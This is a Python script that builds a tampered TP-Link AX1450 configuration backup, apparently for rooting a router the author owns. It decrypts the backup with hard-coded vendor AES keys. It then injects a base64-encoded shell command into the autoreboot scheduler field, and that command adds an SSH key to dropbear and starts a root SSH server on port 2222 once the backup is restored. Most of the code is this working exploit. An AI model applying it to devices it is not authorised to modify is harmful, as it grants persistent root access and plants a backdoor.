#!/usr/bin/env python3
"""Prepare an offline, key-only SSH experiment for the owned AX1450 v1.

Adapted from maxilosgr/archer-ax10-root-exploit's backup format and scheduler
finding. This does not contact the router or restore the resulting backup.
"""

import argparse
import base64
import copy
import hashlib
import io
import ipaddress
from pathlib import Path
import re
import shlex
import subprocess
import tarfile
import zlib


# These are vendor firmware constants, not credentials for this router.
KEY = "2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836"
IV = "360028C9064242F81074F4C127D299F6"


def aes(data, openssl, decrypt=False):
    return subprocess.run(
        [
            openssl,
            "enc",
            "-aes-256-cbc",
            "-d" if decrypt else "-e",
            "-K",
            KEY,
            "-iv",
            IV,
        ],
        input=data,
        capture_output=True,
        check=True,
    ).stdout


def unpack(data, openssl):
    return zlib.decompress(aes(data, openssl, decrypt=True))


def pack(data, openssl):
    return aes(zlib.compress(data), openssl)


def change_field(block, tag, value):
    result, count = re.subn(
        rf"(<{tag}>).*?(</{tag}>)",
        lambda m: m[1] + value + m[2],
        block,
        flags=re.S,
    )
    if count != 1:
        raise ValueError(f"Expected exactly one {tag} field, found {count}")
    return result


def patch_config(xml, command):
    # TP-Link's XML-like format contains numeric element names (e.g. 11kEnable),
    # so a normal XML parser rejects it. Keep every unrelated byte unchanged.
    pattern = r'<autoreboot>\s*<default name="reboot">.*?</default>\s*</autoreboot>'
    found = list(re.finditer(pattern, xml, re.S))
    if len(found) != 1:
        raise ValueError("Expected one autoreboot section")
    old = found[0].group()
    new = old
    for tag, value in [
        ("enable", "on"),
        ("cycle", "week"),
        ("time", "00:03"),
        ("day", f"* {command} #"),
    ]:
        new = change_field(new, tag, value)
    xml = xml.replace(old, new, 1)

    pattern = r'<timeserver name="ntp">.*?</timeserver>'
    found = list(re.finditer(pattern, xml, re.S))
    if len(found) != 1:
        raise ValueError("Expected one NTP section")
    old_ntp = found[0].group()
    new_ntp, count = re.subn(
        r"<list>.*?</list>",
        "<list>\n<server>192.0.2.1</server>\n</list>",
        old_ntp,
        flags=re.S,
    )
    if count != 1:
        raise ValueError("Expected one NTP server list")
    return xml.replace(old_ntp, new_ntp, 1)


def bootstrap(public_key, ap, desktop):
    return f"""#!/bin/sh
set -eu
umask 077
test ! -s /tmp/ax1450-root.pid || exit 0
iptables -I INPUT 1 -p tcp --dport 2222 ! -s {desktop} -j DROP
iptables -I INPUT 1 -p tcp --dport 2222 -s {desktop} -j ACCEPT
mkdir -p /etc/dropbear
test ! -f /etc/dropbear/authorized_keys || cp -p /etc/dropbear/authorized_keys /tmp/ax1450-original-authorized-keys
printf '%s\\n' {shlex.quote(public_key)} >> /etc/dropbear/authorized_keys
chmod 700 /etc/dropbear
chmod 600 /etc/dropbear/authorized_keys
/usr/sbin/dropbear -L -s -j -k -6 -p {ap}:2222 -P /tmp/ax1450-root.pid -r /etc/dropbear/dropbear_rsa_host_key
"""


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("backup", type=Path)
    parser.add_argument("public_key", type=Path)
    parser.add_argument("output", type=Path)
    parser.add_argument("--ap", default="192.168.10.161")
    parser.add_argument("--desktop", default="192.168.10.122")
    parser.add_argument("--openssl", default="openssl")
    args = parser.parse_args()
    ap = str(ipaddress.IPv4Address(args.ap))
    desktop = str(ipaddress.IPv4Address(args.desktop))
    public_key = args.public_key.read_text().strip()
    if not re.fullmatch(r"ssh-rsa [A-Za-z0-9+/=]+ ax1450-lab", public_key):
        raise ValueError("Use the dedicated RSA public key with comment ax1450-lab")
    if args.output.exists():
        raise ValueError("Refusing to overwrite an existing output file")

    original = args.backup.read_bytes()
    outer = unpack(original, args.openssl)
    script = bootstrap(public_key, ap, desktop)
    encoded = base64.b64encode(script.encode()).decode()
    command = f"echo {encoded} | /usr/bin/openssl base64 -d -A | /bin/sh"
    if any(c in command for c in "<>&%\n"):
        raise ValueError("Unexpected XML/cron metacharacter in command")
    members = []
    changes = []
    with tarfile.open(fileobj=io.BytesIO(outer[16:])) as archive:
        for member in archive:
            if not (member.isdir() or member.isfile()):
                raise ValueError("Unexpected archive member type")
            if member.isfile():
                data = archive.extractfile(member).read()
                if member.name in (
                    "./ori-backup-user-config.bin",
                    "./ori-backup-router-config.bin",
                ):
                    xml = unpack(data, args.openssl).decode()
                    patched = patch_config(xml, command)
                    data = pack(patched.encode(), args.openssl)
                    assert unpack(data, args.openssl).decode() == patched
                    changes.append(member.name)
            else:
                data = b""
            updated = copy.copy(member)
            updated.size = len(data)
            members.append((updated, data))
    if len(changes) != 2:
        raise ValueError("Expected both user and router configuration members")

    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w", format=tarfile.GNU_FORMAT) as archive:
        for member, data in members:
            archive.addfile(member, io.BytesIO(data) if member.isfile() else None)
    # The community format preserves this vendor prefix; it is not MD5(tar).
    rebuilt = outer[:16] + stream.getvalue()
    output = pack(rebuilt, args.openssl)
    assert unpack(output, args.openssl) == rebuilt
    with args.output.open("xb") as file:
        args.output.chmod(0o600)
        file.write(output)
    script_path = args.output.with_suffix(".bootstrap.sh")
    script_path.write_text(script)
    script_path.chmod(0o600)
    print("Original SHA256:", hashlib.sha256(original).hexdigest())
    print("Prepared SHA256:", hashlib.sha256(output).hexdigest())
    print("Changed only scheduler and NTP sections in:", ", ".join(changes))
    print(f"SSH: {ap}:2222, key-only, source restricted to {desktop}")
    print("No router changes made by this script. Keep the original backup.")


if __name__ == "__main__":
    main()
